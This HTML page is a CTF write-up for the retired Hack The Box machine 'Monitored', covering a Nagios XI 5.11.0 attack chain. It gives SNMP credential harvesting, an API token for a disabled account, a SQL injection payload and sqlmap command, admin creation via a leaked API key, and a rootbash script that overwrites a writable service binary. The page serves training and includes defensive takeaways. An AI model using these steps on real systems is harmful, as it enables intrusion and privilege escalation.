@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Monitored &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Monitored</h1>
+    
+    <div class="tags"><span class="tag">Linux</span><span class="tag">SNMP</span><span class="tag">NagiosXI</span><span class="tag">SQLi</span><span class="tag">SQLMap</span><span class="tag">APIAbuse</span><span class="tag">credentialhunting</span><span class="tag">SUIDBinary</span><span class="tag">ServiceFileWrite</span><span class="tag">rootbash</span><span class="tag">verbtampering</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#nagios-api-verb-tampering-to-get-a-token">Nagios API, Verb Tampering to Get a Token</a><a class="lvl3" href="#sql-injection-admin-api-key">SQL Injection → Admin API Key</a><a class="lvl3" href="#api-admin-user-creation-nagios-rce">API Admin User Creation → Nagios RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#writable-nagios-binary-rootbash-root">Writable nagios Binary → rootbash → root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Monitored is a medium Linux box running Nagios XI 5.11.0. SNMP leaks credentials for a disabled Nagios account. The Nagios API's authenticate endpoint still issues tokens for disabled users via a verb-tampered POST request; that token grants access to an authenticated SQLi in the admin banner endpoint. SQLMap dumps the admin API key, which is used to create a new admin account. The foothold comes via a Nagios custom command. Root is achieved by replacing the <code>nagios</code> binary (world-writable) with a SUID rootbash script, then restarting the service through a legitimately sudo-able management script.</p>
+<h2 id="recon">Recon</h2>
+<p>Port 80 redirected to <code>https://nagios.monitored.htb/</code>. SSL certificate enumeration yielded the email <code>support@monitored.htb</code>. GoBuster found the <code>/nagios</code> path requiring authentication.</p>
+<p>UDP SNMP was open. Walking it:</p>
+<pre><code class="language-sh">snmpwalk -v2c -c public 10.129.x.x
+iso.3.6.1.2.1.25.4.2.1.5.611 = STRING: &quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc ‹redacted› &quot;
+</code></pre>
+<blockquote>
+<p><strong>SNMP process args as a credential oracle:</strong> the <code>hrSWRunParameters</code> OID stores full command-line arguments. A monitoring script running with credentials as CLI flags exposes them to any SNMP reader. The value here gives the <code>svc</code> account password directly.</p>
+</blockquote>
+<p>Credentials: <code>svc:‹redacted›</code></p>
+<p>These failed at the Nagios web login because <code>svc</code> is disabled in Nagios.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="nagios-api-verb-tampering-to-get-a-token">Nagios API, Verb Tampering to Get a Token</h3>
+<p>The Nagios XI API authenticates at <code>/nagiosxi/api/v1/authenticate</code>. Visiting it by GET returns "You can only use POST with authenticate." Intercepting in Burp and converting to POST with credentials in the body:</p>
+<pre><code class="language-http">POST /nagiosxi/api/v1/authenticate HTTP/1.1
+Host: nagios.monitored.htb
+Content-Type: application/x-www-form-urlencoded
+
+username=svc&amp;password=‹redacted›
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-json">{
+  &quot;username&quot;:&quot;svc&quot;,&quot;user_id&quot;:&quot;2&quot;,
+  &quot;auth_token&quot;:&quot;‹redacted›&quot;,
+  &quot;valid_min&quot;:5,&quot;valid_until&quot;:&quot;...&quot;
+}
+</code></pre>
+<blockquote>
+<p><strong>Why the API issues tokens for disabled users:</strong> the API authentication endpoint validates the username and password against the database but does not check the <code>enabled</code> flag at token issuance. The UI login does check it. This inconsistency gives API access to accounts that appear locked out of the web interface.</p>
+</blockquote>
+<p>Using the token as a URL parameter to access the dashboard:</p>
+<pre><code>https://nagios.monitored.htb/nagiosxi/?token=‹redacted›
+</code></pre>
+<p>Version discovered in the UI: <strong>Nagios XI 5.11.0</strong></p>
+<h3 id="sql-injection-admin-api-key">SQL Injection → Admin API Key</h3>
+<p>Nagios XI 5.11.0 has a SQLi in the admin banner acknowledgment endpoint. The <code>id</code> parameter is injectable:</p>
+<pre><code class="language-http">POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
+Cookie: nagiosxi=&lt;session&gt;
+Content-Type: application/x-www-form-urlencoded
+
+action=acknowledge_banner_message&amp;id=3'
+</code></pre>
+<p>Response confirmed injection:</p>
+<pre><code>SQL Error [nagiosxi] : You have an error in your SQL syntax; check the manual...
+</code></pre>
+<p>SQLMap against the endpoint to dump the <code>xi_users</code> table:</p>
+<pre><code class="language-sh">sqlmap -u &quot;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php&quot; \
+  --data=&quot;id=3&amp;action=acknowledge_banner_message&quot; -p id \
+  --cookie &quot;nagiosxi=&lt;session&gt;&quot; --batch --threads 10 -D nagiosxi -T xi_users --dump
+</code></pre>
+<p>Output included the admin API key:</p>
+<pre><code>nagiosadmin | api_key: IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+</code></pre>
+<h3 id="api-admin-user-creation-nagios-rce">API Admin User Creation → Nagios RCE</h3>
+<p>The admin API key unlocks the <code>/system/user</code> endpoint. Referencing an old exploit (EDB-44560) for the user creation parameter format:</p>
+<pre><code class="language-http">POST /nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=evil&amp;password=password1&amp;name=evil&amp;email=evil@monitored.htb&amp;auth_level=admin&amp;force_pw_change=0
+</code></pre>
+<pre><code class="language-json">{&quot;success&quot;:&quot;User account evil was added successfully!&quot;,&quot;user_id&quot;:6}
+</code></pre>
+<p>Logging in as <code>evil:password1</code> granted full Nagios admin access. A custom command was created via Configure &gt; Core Config Manager, then triggered by running it against localhost from the hosts menu. This executed a reverse shell as <code>nagios</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="writable-nagios-binary-rootbash-root">Writable nagios Binary → rootbash → root</h3>
+<p>LinPEAS flagged several writable executables called by systemd services:</p>
+<pre><code>/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable:
+/usr/local/nagios/bin/nagios
+</code></pre>
+<p>The <code>nagios</code> binary was world-writable. The plan: replace it with a script that copies bash and sets the SUID bit, then restart the service using the <code>manage_services.sh</code> script (which the nagios user can run via sudo):</p>
+<pre><code class="language-sh"># Back up the real binary
+mv /usr/local/nagios/bin/nagios /usr/local/nagios/bin/nagios.bak
+
+# Write the rootbash payload
+cat &gt; /usr/local/nagios/bin/nagios &lt;&lt; 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+EOF
+chmod +x /usr/local/nagios/bin/nagios
+
+# Restart to trigger execution
+sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
+</code></pre>
+<p>The service restart failed (because the fake binary doesn't behave like a daemon), but the payload still ran before exiting:</p>
+<pre><code class="language-sh">ls -lah /tmp/rootbash
+-rwsrwsrwx 1 root root 1.2M Sep 27 15:19 /tmp/rootbash
+</code></pre>
+<pre><code class="language-sh">/tmp/rootbash -p
+‹redacted›
+root
+</code></pre>
+<blockquote>
+<p><strong>Why SUID rootbash works with <code>-p</code>:</strong> bash's <code>-p</code> flag tells it not to reset the effective UID to the real UID, which it normally does as a safety measure. With SUID set (running as root), <code>-p</code> preserves that root effective UID, giving a root shell.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">cat /root/root.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>SNMP process arguments are a reliable credential source.</strong> Any monitoring or management script that passes secrets via CLI flags exposes them to SNMP readers with the right community string.</li>
+<li><strong>API authentication and UI authentication can diverge.</strong> Disabled accounts may still receive API tokens if the lockout check is only applied at the web login layer.</li>
+<li><strong>Authenticated SQLi in a web app often leads to credential or API-key exfiltration</strong>, which then unlocks further admin-level API abuse.</li>
+<li><strong>World-writable service binaries are root escalation paths.</strong> If a systemd service calls an executable that any user can overwrite, replacing it with a SUID-setting payload and triggering a restart yields root.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
